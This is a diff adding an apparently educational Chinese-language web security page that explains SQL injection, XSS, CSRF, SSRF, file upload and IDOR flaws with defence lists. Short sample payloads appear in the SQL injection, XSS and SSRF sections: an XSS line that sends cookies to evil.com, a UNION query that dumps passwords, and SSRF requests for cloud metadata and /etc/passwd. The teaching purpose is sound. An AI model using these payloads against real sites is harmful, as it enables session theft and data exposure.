@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://unpkg.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'self';" />
+  <title>漏洞详情 — WebPenTest Lab</title>
+  <link rel="stylesheet" href="../css/common.css" />
+</head>
+<body>
+  <!-- 跳过导航链接（无障碍） -->
+  <a href="#main-content" class="skip-nav">跳到主要内容</a>
+
+  <!-- ========== Header（由 components.js 动态注入）========== -->
+  <header id="site-header" class="site-header"></header>
+
+  <main id="main-content">
+    <!-- ========== 页面标题 ========== -->
+    <section class="page-hero">
+      <div class="container">
+        <div class="breadcrumb">
+          <a href="index.html">首页</a><span class="sep">/</span>
+          <a href="list.html">漏洞库</a><span class="sep">/</span>
+          <span>漏洞详情</span>
+        </div>
+        <h1>漏洞深度分析</h1>
+        <p>深入理解漏洞原理、攻击向量与完整防御策略</p>
+      </div>
+    </section>
+
+    <!-- ========== SQL 注入详情 ========== -->
+    <section class="section" style="padding-top: 0;">
+      <div class="container">
+        <!-- 侧边栏 + 主内容布局 (PC端) -->
+        <div class="detail-layout">
+
+          <!-- 侧边栏导航 -->
+          <aside class="detail-sidebar">
+            <div style="position: sticky; top: 100px;">
+              <div class="card card-glass" style="padding: 1.5rem;">
+                <h4 style="margin-bottom: 1rem; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.1em; color: var(--color-text-tertiary);">内容导航</h4>
+                <nav style="display: flex; flex-direction: column; gap: 0.4rem;">
+                  <a href="#sqli" style="color: var(--color-accent); font-size: 0.9rem;">SQL 注入</a>
+                  <a href="#xss" style="color: var(--color-text-tertiary); font-size: 0.9rem;">跨站脚本 (XSS)</a>
+                  <a href="#csrf" style="color: var(--color-text-tertiary); font-size: 0.9rem;">CSRF 攻击</a>
+                  <a href="#ssrf" style="color: var(--color-text-tertiary); font-size: 0.9rem;">SSRF 攻击</a>
+                  <a href="#file-upload" style="color: var(--color-text-tertiary); font-size: 0.9rem;">文件上传漏洞</a>
+                  <a href="#idor" style="color: var(--color-text-tertiary); font-size: 0.9rem;">IDOR 越权</a>
+                </nav>
+              </div>
+            </div>
+          </aside>
+
+          <!-- 主内容区 -->
+          <div>
+            <!-- SQL 注入 -->
+            <article id="sqli" class="card card-glow-cyan" style="margin-bottom: 2rem; padding: 2.5rem;">
+              <div class="flex-between" style="margin-bottom: 1rem; flex-wrap: wrap; gap: 0.5rem;">
+                <h2 style="font-size: 1.8rem;">🗄️ SQL 注入 (SQL Injection)</h2>
+                <span class="badge risk-critical">严重</span>
+              </div>
+              <div style="display: flex; gap: 0.5rem; margin-bottom: 1.5rem; flex-wrap: wrap;">
+                <span class="badge badge-cyan">OWASP A03:2021</span>
+                <span class="badge badge-blue">CWE-89</span>
+                <span class="badge badge-purple">注入类</span>
+              </div>
+
+              <h3>漏洞原理</h3>
+              <p>当应用程序将用户输入直接拼接到 SQL 查询语句中时，攻击者可以通过构造特殊的输入来改变 SQL 语句的语义，从而执行非预期的数据库操作。</p>
+
+              <div class="terminal-box" style="margin: 1.5rem 0;">
+                <div class="terminal-header">
+                  <span class="terminal-dot terminal-dot--red"></span>
+                  <span class="terminal-dot terminal-dot--yellow"></span>
+                  <span class="terminal-dot terminal-dot--green"></span>
+                  <span class="terminal-title">攻击示例 — bash</span>
+                </div>
+                <div class="terminal-body">
+                  <div><span class="prompt">$</span> <span class="cmd"># 正常查询语句</span></div>
+                  <div>SELECT * FROM users WHERE name = '<span style="color:#fca5a5;">admin</span>'</div>
+                  <div style="margin-top: 0.5rem;"><span class="prompt">$</span> <span class="cmd"># 攻击者输入: admin'--</span></div>
+                  <div>SELECT * FROM users WHERE name = '<span style="color:#fca5a5;">admin'--</span>'</div>
+                  <div style="margin-top: 0.5rem; color: var(--color-accent-red);"># -- 是 SQL 注释符，后续的密码验证部分被注释掉了</div>
+                  <div style="margin-top: 0.5rem;"><span class="prompt">$</span> <span class="cmd"># UNION 注入获取数据</span></div>
+                  <div>SELECT * FROM users WHERE id = '<span style="color:#fca5a5;">1' UNION SELECT username,password FROM users--</span>'</div>
+                </div>
+              </div>
+
+              <h3>攻击类型</h3>
+              <div class="grid grid-2" style="margin: 1rem 0;">
+                <div class="card card-glass" style="padding: 1.25rem;">
+                  <strong>基于报错的注入</strong>
+                  <p style="font-size:0.85rem; margin-top:0.3rem;">通过数据库错误信息推断表结构</p>
+                </div>
+                <div class="card card-glass" style="padding: 1.25rem;">
+                  <strong>基于布尔的盲注</strong>
+                  <p style="font-size:0.85rem; margin-top:0.3rem;">通过页面响应差异判断查询结果</p>
+                </div>
+                <div class="card card-glass" style="padding: 1.25rem;">
+                  <strong>基于时间的盲注</strong>
+                  <p style="font-size:0.85rem; margin-top:0.3rem;">通过响应延迟时间判断数据</p>
+                </div>
+                <div class="card card-glass" style="padding: 1.25rem;">
+                  <strong>UNION 联合查询</strong>
+                  <p style="font-size:0.85rem; margin-top:0.3rem;">合并多个查询结果集获取数据</p>
+                </div>
+              </div>
+
+              <h3>防御方案</h3>
+              <ul style="color: var(--color-text-secondary); line-height: 2; padding-left: 1.5rem;">
+                <li><strong>参数化查询</strong>：使用 Prepared Statement，将 SQL 逻辑与数据分离</li>
+                <li><strong>ORM 框架</strong>：使用成熟的 ORM 自动处理查询参数化</li>
+                <li><strong>输入校验</strong>：对用户输入进行白名单验证</li>
+                <li><strong>最小权限</strong>：数据库账户使用最小必要权限</li>
+                <li><strong>WAF</strong>：部署 Web 应用防火墙进行规则过滤</li>
+                <li><strong>错误处理</strong>：不向用户展示详细的数据库错误信息</li>
+              </ul>
+            </article>
+
+            <!-- XSS -->
+            <article id="xss" class="card card-glow-cyan" style="margin-bottom: 2rem; padding: 2.5rem;">
+              <div class="flex-between" style="margin-bottom: 1rem; flex-wrap: wrap; gap: 0.5rem;">
+                <h2 style="font-size: 1.8rem;">💉 跨站脚本 (XSS)</h2>
+                <span class="badge risk-high">高危</span>
+              </div>
+              <div style="display: flex; gap: 0.5rem; margin-bottom: 1.5rem; flex-wrap: wrap;">
+                <span class="badge badge-cyan">OWASP A03:2021</span>
+                <span class="badge badge-blue">CWE-79</span>
+                <span class="badge badge-purple">客户端安全</span>
+              </div>
+
+              <h3>漏洞原理</h3>
+              <p>攻击者将恶意 JavaScript 代码注入到网页中，当其他用户访问该页面时，脚本在受害者浏览器中执行。根据注入方式不同，分为反射型、存储型和 DOM 型三种。</p>
+
+              <div class="terminal-box" style="margin: 1.5rem 0;">
+                <div class="terminal-header">
+                  <span class="terminal-dot terminal-dot--red"></span>
+                  <span class="terminal-dot terminal-dot--yellow"></span>
+                  <span class="terminal-dot terminal-dot--green"></span>
+                  <span class="terminal-title">攻击示例 — bash</span>
+                </div>
+                <div class="terminal-body">
+                  <div><span class="prompt">$</span> <span class="cmd"># 反射型 XSS — URL 参数注入</span></div>
+                  <div style="color:#fca5a5;">https://example.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>
+                  <div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># 存储型 XSS — 留言板注入</span></div>
+                  <div style="color:#fca5a5;">&lt;img src=x onerror="fetch('https://evil.com/?c='+document.cookie)"&gt;</div>
+                  <div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># DOM 型 XSS — innerHTML 直接插入</span></div>
+                  <div>document.getElementById('msg').<span style="color:#fca5a5;">innerHTML</span> = location.hash.slice(1);</div>
+                </div>
+              </div>
+
+              <h3>防御方案</h3>
+              <ul style="color: var(--color-text-secondary); line-height: 2; padding-left: 1.5rem;">
+                <li><strong>输出编码</strong>：对插入 HTML 的数据进行实体编码</li>
+                <li><strong>CSP</strong>：配置 Content-Security-Policy 限制脚本来源</li>
+                <li><strong>HttpOnly Cookie</strong>：防止 JavaScript 读取敏感 Cookie</li>
+                <li><strong>避免危险 API</strong>：不使用 innerHTML/document.write/eval</li>
+                <li><strong>前端框架</strong>：Vue/React 默认会对插值进行转义</li>
+              </ul>
+            </article>
+
+            <!-- CSRF -->
+            <article id="csrf" class="card card-glow-cyan" style="margin-bottom: 2rem; padding: 2.5rem;">
+              <div class="flex-between" style="margin-bottom: 1rem; flex-wrap: wrap; gap: 0.5rem;">
+                <h2 style="font-size: 1.8rem;">🎭 跨站请求伪造 (CSRF)</h2>
+                <span class="badge risk-high">高危</span>
+              </div>
+              <div style="display: flex; gap: 0.5rem; margin-bottom: 1.5rem; flex-wrap: wrap;">
+                <span class="badge badge-cyan">OWASP A01:2021</span>
+                <span class="badge badge-blue">CWE-352</span>
+                <span class="badge badge-orange">会话安全</span>
+              </div>
+
+              <h3>漏洞原理</h3>
+              <p>攻击者诱导已登录用户访问恶意页面，利用浏览器自动携带 Cookie 的特性，向目标网站发送伪造请求，在用户不知情的情况下执行敏感操作（如修改密码、转账）。</p>
+
+              <h3>防御方案</h3>
+              <ul style="color: var(--color-text-secondary); line-height: 2; padding-left: 1.5rem;">
+                <li><strong>Anti-CSRF Token</strong>：每个表单嵌入随机 Token，服务端校验</li>
+                <li><strong>SameSite Cookie</strong>：设置 SameSite=Strict/Lax 限制跨站发送</li>
+                <li><strong>Referer/Origin 校验</strong>：检查请求来源是否为可信域名</li>
+                <li><strong>二次验证</strong>：敏感操作要求输入密码或验证码</li>
+                <li><strong>自定义请求头</strong>：使用 X-Requested-With 等自定义 Header</li>
+              </ul>
+            </article>
+
+            <!-- SSRF -->
+            <article id="ssrf" class="card card-glow-cyan" style="margin-bottom: 2rem; padding: 2.5rem;">
+              <div class="flex-between" style="margin-bottom: 1rem; flex-wrap: wrap; gap: 0.5rem;">
+                <h2 style="font-size: 1.8rem;">🔄 服务端请求伪造 (SSRF)</h2>
+                <span class="badge risk-high">高危</span>
+              </div>
+              <div style="display: flex; gap: 0.5rem; margin-bottom: 1.5rem; flex-wrap: wrap;">
+                <span class="badge badge-cyan">OWASP A10:2021</span>
+                <span class="badge badge-blue">CWE-918</span>
+                <span class="badge badge-purple">服务端安全</span>
+              </div>
+
+              <h3>漏洞原理</h3>
+              <p>应用程序从用户输入中获取 URL 并发起请求，攻击者通过构造内网地址或特殊协议 URL，诱导服务器访问内部系统，绕过防火墙访问受保护的资源。</p>
+
+              <div class="terminal-box" style="margin: 1.5rem 0;">
+                <div class="terminal-header">
+                  <span class="terminal-dot terminal-dot--red"></span>
+                  <span class="terminal-dot terminal-dot--yellow"></span>
+                  <span class="terminal-dot terminal-dot--green"></span>
+                  <span class="terminal-title">攻击示例 — bash</span>
+                </div>
+                <div class="terminal-body">
+                  <div><span class="prompt">$</span> <span class="cmd"># 读取云服务器元数据 (AWS)</span></div>
+                  <div style="color:#fca5a5;">http://169.254.169.254/latest/meta-data/</div>
+                  <div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># 扫描内网端口</span></div>
+                  <div style="color:#fca5a5;">http://192.168.1.1:6379/ (Redis)</div>
+                  <div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># 利用 file 协议读取文件</span></div>
+                  <div style="color:#fca5a5;">file:///etc/passwd</div>
+                </div>
+              </div>
+
+              <h3>防御方案</h3>
+              <ul style="color: var(--color-text-secondary); line-height: 2; padding-left: 1.5rem;">
+                <li><strong>URL 白名单</strong>：仅允许访问预定义的域名或 IP 范围</li>
+                <li><strong>协议限制</strong>：仅允许 http/https 协议</li>
+                <li><strong>内网地址过滤</strong>：拒绝 127.0.0.1/8、10.0.0.0/8、172.16.0.0/12、192.168.0.0/16</li>
+                <li><strong>DNS 解析校验</strong>：解析后检查 IP 是否属于内网</li>
+                <li><strong>网络隔离</strong>：代理服务器与内网资源分离部署</li>
+              </ul>
+            </article>
+
+            <!-- 文件上传 -->
+            <article id="file-upload" class="card card-glow-cyan" style="margin-bottom: 2rem; padding: 2.5rem;">
+              <div class="flex-between" style="margin-bottom: 1rem; flex-wrap: wrap; gap: 0.5rem;">
+                <h2 style="font-size: 1.8rem;">📤 文件上传漏洞</h2>
+                <span class="badge risk-critical">严重</span>
+              </div>
+              <div style="display: flex; gap: 0.5rem; margin-bottom: 1.5rem; flex-wrap: wrap;">
+                <span class="badge badge-cyan">OWASP A04:2021</span>
+                <span class="badge badge-blue">CWE-434</span>
+                <span class="badge badge-red">文件安全</span>
+              </div>
+
+              <h3>漏洞原理</h3>
+              <p>应用程序未对上传文件进行充分的类型、扩展名和内容校验，攻击者可上传包含恶意代码的文件（如 PHP WebShell），在服务器端执行任意命令。</p>
+
+              <h3>防御方案</h3>
+              <ul style="color: var(--color-text-secondary); line-height: 2; padding-left: 1.5rem;">
+                <li><strong>文件类型白名单</strong>：只允许指定的文件扩展名和 MIME 类型</li>
+                <li><strong>内容检测</strong>：检测文件 Magic Number (文件头) 而非仅依赖扩展名</li>
+                <li><strong>文件重命名</strong>：使用随机生成的文件名，避免保留原始扩展名</li>
+                <li><strong>存储隔离</strong>：上传目录与执行目录分离，禁止在上传目录执行脚本</li>
+                <li><strong>权限控制</strong>：上传目录设置最小权限，禁用脚本执行引擎</li>
+                <li><strong>病毒扫描</strong>：集成 ClamAV 等工具扫描恶意文件</li>
+              </ul>
+            </article>
+
+            <!-- IDOR -->
+            <article id="idor" class="card card-glow-cyan" style="padding: 2.5rem;">
+              <div class="flex-between" style="margin-bottom: 1rem; flex-wrap: wrap; gap: 0.5rem;">
+                <h2 style="font-size: 1.8rem;">🔑 不安全的直接对象引用 (IDOR)</h2>
+                <span class="badge risk-medium">中危</span>
+              </div>
+              <div style="display: flex; gap: 0.5rem; margin-bottom: 1.5rem; flex-wrap: wrap;">
+                <span class="badge badge-cyan">OWASP A01:2021</span>
+                <span class="badge badge-blue">CWE-639</span>
+                <span class="badge badge-orange">权限问题</span>
+              </div>
+
+              <h3>漏洞原理</h3>
+              <p>应用程序使用用户提供的标识符（如 ID 号）直接访问后端对象，但未验证当前用户是否拥有对该对象的访问权限，导致越权访问。</p>
+
+              <h3>防御方案</h3>
+              <ul style="color: var(--color-text-secondary); line-height: 2; padding-left: 1.5rem;">
+                <li><strong>服务端权限校验</strong>：每次访问对象时验证当前用户身份与权限</li>
+                <li><strong>使用 UUID/GUID</strong>：使用不可预测的随机标识符替代自增 ID</li>
+                <li><strong>间接引用映射</strong>：使用 Session 级别的对象引用映射表</li>
+                <li><strong>最小权限原则</strong>：用户只能访问自己拥有的资源</li>
+              </ul>
+            </article>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- ========== Footer（由 components.js 动态注入）========== -->
+  <footer id="site-footer" class="site-footer"></footer>
+
+  <script src="../js/components.js"></script>
+  <script src="../js/common.js"></script>
+  <script>
+    /* 读取 URL 参数 id，自动滚动到对应漏洞章节 */
+    (function () {
+      'use strict';
+      const params = new URLSearchParams(window.location.search);
+      const vulnId = params.get('id');
+      if (vulnId) {
+        const target = document.getElementById(vulnId);
+        if (target) {
+          setTimeout(function () {
+            target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+          }, 300);
+        }
+      }
+    })();
+  </script>
+</body>
+</html>
